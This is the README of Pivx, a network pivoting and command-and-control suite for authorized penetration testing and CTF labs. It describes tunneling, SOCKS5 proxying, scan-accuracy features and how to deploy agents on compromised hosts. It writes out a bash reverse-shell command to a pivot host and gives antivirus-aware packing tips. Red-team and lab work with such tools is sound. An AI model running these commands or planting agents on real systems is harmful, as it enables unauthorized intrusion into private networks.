[English](README.md) | [Español](docs/README_es.md) | [Português](docs/README_pt.md) | [中文](docs/README_zh.md)

<div align="center">
  <img src="assets/logo.svg" alt="Pivx" width="220">
  <p><em>High Fidelity Hybrid Framing C2 &amp; Pivoting Suite</em></p>
  <br>

  ![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
  ![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
  ![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
  ![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
  ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
  [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)

</div>

**Network pivoting and routing tool for authorized penetration testing.**
Pivx uses a **Hybrid Framing** architecture that multiplexes **L3 tunneling,
L4 port forwarding, and L7 SOCKS5** over a single WebSocket connection with
**ultra-low latency** — no extra framing headers, no secondary connections.

> **Current status (Phase 3):** full pivoting suite for CTF and pentesting.
> See [`ARCHITECTURE.md`](ARCHITECTURE.md) for the complete design.

---

## ⚡ Key Features

- **L3 Tunnel** — TUN interface `pivx0` with userland TCP/IP stack (gVisor netstack) on the agent. Full IP routing through the tunnel.
- **L4 Port Forwarding** — Local (`-L`) and remote (`-R`) forwards multiplexed over the same WebSocket. Ideal for reverse shells.
- **L7 SOCKS5 Proxy** — Dynamic proxy with DNS resolution on the agent side. Works with proxychains, ffuf, Burp Suite, and any SOCKS-aware tool.
- **High Fidelity Scanning** — ICMP Smartping, Magic IP, SYN-Cookie nullification, and smart RST for accurate nmap results through the tunnel.
- **Hybrid Framing** — Control (JSON text frames) + data (binary frames) on one WebSocket. L3 packets (IP nibble `0x4`/`0x6`) and MUX streams (`0x01`) coexist in binary frames with zero-overhead discrimination.
- **Kill Switch** — Remote agent termination from the C2 dashboard with one click.
- **Hardened Data Plane** — MTU 1350 (WebSocket/TLS headroom), backpressure with drop, anti-uplink route protection.
- **Web Dashboard** — Streamlit-based C2 with real-time agent status, tunnel control, route management, and port forwarding UI.

---

## 🎯 High Fidelity & Evasion

Pivx implements network fidelity improvements that make scans through the tunnel indistinguishable from native connections. All features verified in automated Docker lab tests.

### ICMP Smartping

Unlike typical pivoting tools, Pivx supports **real ping through the L3 tunnel**. The agent intercepts ICMP Echo Requests, runs an OS-level `ping` to verify the host is alive, and constructs a proper Echo Reply with correct RFC 1071 checksums.

```bash
# From your C2, with tunnel and route active:
ping -c 2 10.10.20.100

PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
64 bytes from 10.10.20.100: icmp_seq=1 ttl=64 time=5.03 ms
64 bytes from 10.10.20.100: icmp_seq=2 ttl=64 time=2.88 ms

--- 10.10.20.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

This enables nmap **host discovery without `-Pn`** — hosts that respond to ping show as *up* and nmap scans only those.

### Magic IP (`240.0.0.1`)

The reserved Class-E range `240.0.0.0/4` is rewritten to `127.0.0.1` on the agent, both through the L3 tunnel and via SOCKS5/MUX. Access services that only listen on the victim's localhost (databases, admin panels, internal APIs) without IP conflicts:

```bash
# Via SOCKS5 — access hidden HTTP server on agent's localhost:8080:
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/

# Returns: directory listing of agent's filesystem
<!DOCTYPE HTML>
<html lang="en">
<head><title>Directory listing for /</title></head>
...
```

Any IP in `240.x.x.x` works: `240.0.0.1`, `240.1.2.3`, etc. All redirect to the agent's `127.0.0.1`.

### SYN-Cookie Nullification

Pivx disables gVisor's SYN-Cookies, preventing the netstack from responding SYN-ACK to **every** SYN without creating state. Without this fix, `nmap -sS` would show all ports as *open*. With it, only truly open ports respond.

### Smart RST

When the agent dials a closed port and receives `ECONNREFUSED`, it returns RST to the scanner. If the target doesn't respond (timeout), it stays silent. This lets nmap correctly distinguish between *closed* (RST) and *filtered* (no response) ports.

### Kill Switch

From the C2 dashboard, one click sends `{"type":"kill"}` to the agent, which executes `os.Exit(0)` immediately. The WebSocket closes and the dashboard reflects the change instantly.

### Verified Test Results

| Test | Result | Detail |
|------|--------|--------|
| Smartping L3 (ping through tunnel) | **PASS** | 2/2 replies, ~4ms RTT |
| Magic IP L7 (240.0.0.1:8080 via SOCKS5) | **PASS** | HTTP 200, directory listing |
| Kill Switch (remote os.Exit) | **PASS** | Disconnection in <1s |

---

## 📋 Requirements

- **Server:** Linux or **WSL2** (TUN uses `/dev/net/tun`). Requires **root** (or `CAP_NET_ADMIN`) to create the interface and add routes.
- **Agent:** No Go installation needed — download the prebuilt binary from [Releases](https://github.com/HangLoose84/Pivx/releases). Only Go 1.22+ if building from source.

---

## 🚀 Getting Started

### Auto-Pilot CLI (recommended)

One command to start the C2, wait for an agent, auto-configure SOCKS5 + tunnel + routes, scan the internal network, and drop into a proxied shell:

```bash
sudo server/venv/bin/python pivx-autopilot.py
```

The script will:
1. Start the WebSocket listener on `ws://0.0.0.0:8765`
2. Wait for an agent to connect (deploy one on the compromised host)
3. Auto-start SOCKS5 (`127.0.0.1:1080`), tunnel (`pivx0`), and routes
4. Scan all discovered subnets and show live hosts
5. Open an interactive shell with pre-configured aliases:

```bash
pivx ~/Pivx $ pc curl http://10.10.20.5/         # proxychains shortcut
pivx ~/Pivx $ pscan -p 22,80 10.10.20.0/24       # proxychains + nmap
pivx ~/Pivx $ pscurl http://10.10.20.5/           # curl via SOCKS5
```

### 1) Server (Python, Linux/WSL2)

> **Note for Kali Linux and modern distros:** Python 3.11+ marks system packages as `externally-managed-environment` and blocks global `pip install`. Pivx uses a **virtual environment (`venv`)** to avoid this. The `install.sh` script creates it automatically.

**Quick install (< 2 minutes):**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**Start the C2:**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

`sudo` is required because the server creates the TUN interface and manipulates the kernel routing table. Invoking the venv's `streamlit` directly avoids the need for `sudo -E` or manual venv activation.

WebSocket listener: `ws://0.0.0.0:8765` — Dashboard UI: http://localhost:8501

### 2) Agent

> **No Go installation or compilation needed** if you just want to use Pivx. Download the prebuilt binary from the [**Releases**](https://github.com/HangLoose84/Pivx/releases) tab and upload it to the target machine:
>
> ```bash
> # From the target machine:
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://YOUR_C2:8765
> ```
>
> Available binaries: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`, `pivx-agent-windows-amd64.exe`.

#### Building from source (advanced)

Requires **Go 1.22+**. First time — fetch gVisor (special `go` branch) and resolve dependencies:

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

Run directly:

```bash
go run . --server ws://127.0.0.1:8765
```

#### Cross-compilation with `Makefile` (recommended)

The root `Makefile` cross-compiles static, stripped binaries (`-ldflags="-s -w"` + `-trimpath`, no symbols or DWARF) to minimize size — critical for uploading agents over unstable connections in CTFs.

```bash
make deps           # Once: fetch gVisor (branch `go`) and tidy modules
make                # Build all 3 platforms to ./dist
```

Individual targets:

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # Remove ./dist
```

#### UPX-compressed variants (smaller binaries)

For CTF scenarios where upload speed matters, UPX-compressed variants reduce the binary size to ~40% of the original (~3-4 MB vs ~8 MB). The binary decompresses transparently in memory at launch — no performance impact.

```bash
make all-upx         # Build all 3 platforms + their UPX variants
```

Individual UPX targets:

```bash
make linux-amd64-upx   # -> dist/pivx-agent-linux-amd64-upx
make linux-arm64-upx   # -> dist/pivx-agent-linux-arm64-upx
make windows-amd64-upx # -> dist/pivx-agent-windows-amd64-upx.exe
```

> **Tip:** Use the UPX variant by default for faster uploads. Fall back to the normal binary only if an antivirus flags UPX packing. Requires `upx` installed on the build machine (`apt install upx` / `brew install upx`).

> **Troubleshooting — Wine/Go compatibility:** Running the Windows agent (`.exe`) in Linux-based sandbox environments using Wine (version 8.0 or lower) will fail with a `bcryptprimitives.dll` error. This is not a UPX or agent defect — it is a known incompatibility because the Go runtime (version 1.21+) requires this Windows cryptographic DLL, which older Wine versions do not implement. The agent works perfectly on native Windows systems.

Binaries use `CGO_ENABLED=0` (fully static, no libc dependency on the target). Deployment example:

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://YOUR_C2:8765'
```

### 3) Activate Tunnel & Routes

1. In the dashboard, section **Tunnel**, select the agent and click **Start tunnel** (creates `pivx0`).
2. In **Routes**, add the internal subnet: click a **discovered subnet** from the agent, or type manually (`10.10.20.0/24`).
3. Your local tools now reach the internal network through the agent:

```bash
nmap -sS 10.10.20.0/24          # SYN scan works (Smart RST + no SYN-Cookies)
ping 10.10.20.5                  # Works (Smartping)
curl http://10.10.20.5/
```

### 4) Verification

- Agent appears **online** with hostname/OS/arch and its subnets.
- `ip addr` on the server shows `pivx0`; `ip route` shows subnets routed to `pivx0`.
- Traffic to the internal LAN works; `[tcp] proxy established -> ...` lines appear in the agent log.

### 5) Port Forwarding (L4) & SOCKS5 (L7)

Beyond the L3 tunnel, Pivx multiplexes **TCP streams** over the same WebSocket. These features **do not require the L3 tunnel** — just a connected agent. In the dashboard, section **Port forwarding (L4)**.

#### Local forward (`-L`) — expose an internal service locally

Tab **Local (-L)**. The server opens a port on your machine; the agent dials to an `IP:port` on the internal network.

```bash
# Bind: 127.0.0.1:8080 → Destination (agent): 10.10.20.5:80
curl http://127.0.0.1:8080/     # reaches :80 on the internal network via the agent
```

Useful for accessing admin panels, databases (`:3306`), RDP, etc.

#### Remote forward (`-R`) — receive reverse shells

Tab **Remote (-R)**. The **agent** opens a port on the victim network; incoming connections are forwarded to your local handler.

```bash
# Bind victim: 0.0.0.0:4444 → Local destination: 127.0.0.1:5555
# On your C2:
nc -lvnp 5555
# On the victim: connect to agent_ip:4444 → arrives at your 127.0.0.1:5555
```

#### SOCKS5 (L7) — dynamic proxy for web tools

Section **SOCKS5 Proxy**. Click **Start SOCKS5** (default `127.0.0.1:1080`). **DNS resolution and TCP connections happen on the agent**, so internal hostnames resolve on the victim network.

```bash
# proxychains (configure /etc/proxychains4.conf → socks5 127.0.0.1 1080):
proxychains -q curl http://intranet.victim.local/
proxychains -q smbclient -L //10.10.20.5/

# Direct SOCKS support:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/

# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
#   (check "Do DNS lookups over SOCKS proxy")
```

---

## 🔀 Scenario: Double Hop into Isolated Networks

Real-world example tested with Docker: compromise a machine with **no internet access** through a pivot host bridging two networks.

### Topology

```
  Your machine (Kali)        Public network           Internal network (isolated)
  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
  │  Pivx C2    │◄── WS ──►│  Pivot       │          │  Target          │
  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
  │             │          │  10.10.20.20 │          │  (no internet)   │
  └─────────────┘          └─────────────┘          └──────────────────┘
    SOCKS5 :1080             Pivx Agent               HTTP :80
    Handler :9001            rforward :4444
```

The C2 **cannot reach** `10.10.20.0/24` directly. Pivx solves this.

### Step 1 — Deploy the agent on the pivot host

```bash
scp dist/pivx-agent-linux-amd64 user@10.10.10.20:/tmp/.p
chmod +x /tmp/.p
/tmp/.p --server ws://10.10.10.10:8765
```

The agent connects, reports its interfaces, and discovers subnet `10.10.20.0/24`. The dashboard shows it as **online**.

### Step 2 — Reach the isolated network with SOCKS5 (inbound)

Start SOCKS5 in the dashboard (`127.0.0.1:1080`):

```bash
# Scan the isolated target:
proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100

# Browse the internal web service:
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/

# Directory fuzzing:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

Traffic flows: `your tool → SOCKS5 :1080 → MUX → pivot → 10.10.20.100`.

### Step 3 — Receive reverse shells with remote forward (outbound)

The isolated target can't connect to your C2, but it can reach the pivot. Use **remote forward** to relay connections back:

```bash
# 1) Dashboard: Port forwarding → Remote (-R)
#    Bind victim: 0.0.0.0:4444 → Local destination: 127.0.0.1:9001

# 2) Start your handler:
nc -lvnp 9001

# 3) Execute payload on target pointing to the pivot:
bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
```

Traffic flows: `target → pivot:4444 → MUX → C2:9001`.

### Verified Results

Tested with automated Docker labs (3 containers, 2 isolated networks):

| Test | Result | Latency |
|------|--------|---------|
| SOCKS5 inbound → target:80 | HTTP 200 complete | ~25ms |
| Remote forward ← reverse shell | Payload received at C2:9001 | ~13s (script wait) |
| Residual streams after close | 0 (no leaks) | — |

---

## 🗂️ Project Structure

```
Pivx/
├── Makefile                  # Cross-build (linux/amd64, arm64, win/amd64)
├── pivx-autopilot.py         # Auto-Pilot CLI (one-command setup)
├── assets/                   # Logo and visual assets
│   └── logo.svg
├── agent/                    # Go agent
│   ├── go.mod
│   ├── main.go               # WS transport + control + discovery (anti-uplink)
│   ├── netstack.go           # gVisor stack (userland) + TCP/UDP forwarders (L3)
│   ├── icmp.go               # ICMP Smartping + UDP Port Unreachable injection
│   └── mux.go                # TCP stream multiplexing (L4/L7) over same WS
├── server/
│   ├── app.py                # Streamlit dashboard (tunnel + routes + forwarding + SOCKS)
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # DuckDB persistence (agents, routes, logs)
│       ├── tun.py            # Linux TUN interface (raw-IP, MTU 1350)
│       ├── runtime.py        # TUN <-> WebSocket orchestration (L3 plane)
│       ├── forward.py        # MUX layer: L4 port forwarding + SOCKS5 (L4/L7)
│       └── ws_server.py      # WebSocket listener (control + data + L3/MUX demux)
├── docker/                   # Docker lab configs (not tracked)
├── tests/                    # Integration test scripts (not tracked)
├── docs/                     # Translations (ES, PT, ZH) + tutorials
├── ARCHITECTURE.md
└── README.md
```

---

## ⚠️ Known Limitations

### Scanning tips

Pivx supports **ping through the tunnel** (Smartping) and **SYN scans** (SYN-Cookie nullification + Smart RST). Supported nmap modes:

```bash
nmap -sn 10.10.20.0/24          # Host discovery with ping (Smartping)
nmap -sS 10.10.20.0/24          # SYN scan (accurate open/closed/filtered)
nmap -sT 10.10.20.0/24          # TCP connect scan (always works)
```

> **Note:** Smartping runs a real OS-level `ping` per Echo Request, adding ~3-5ms latency. For large-scale scans, `-Pn` is still faster since it skips the discovery phase.

### Current limitations

- **Single tunnel / single active agent** at a time (CTF-focused). Simultaneous multi-agent is **deferred** (Phase 5).
- **No TLS/wss or agent authentication** yet (Phase 4). Do not use outside a lab or controlled network.
- **SOCKS5** only implements `CONNECT` over TCP (no BIND or UDP ASSOCIATE), sufficient for scanning/fuzzing/web proxying.
- An agent that loses connection without clean shutdown goes **`offline` automatically** after ~45s without pings (server keep-alive sweep).

### Notes (gVisor / environment)

- **gVisor** has a version-sensitive API; this code tracks the `go` branch. If `go mod tidy` misaligns symbols, adjust names in `netstack.go` to the resolved version.
- Not tested with Windows as server (Linux/WSL2 chosen for TUN support).

---

> ⚠️ **Use only on systems you own or with explicit written authorization.**

---

## 📄 License

This project is licensed under the **GNU General Public License v3.0**. See the [LICENSE](LICENSE) file for the full text.
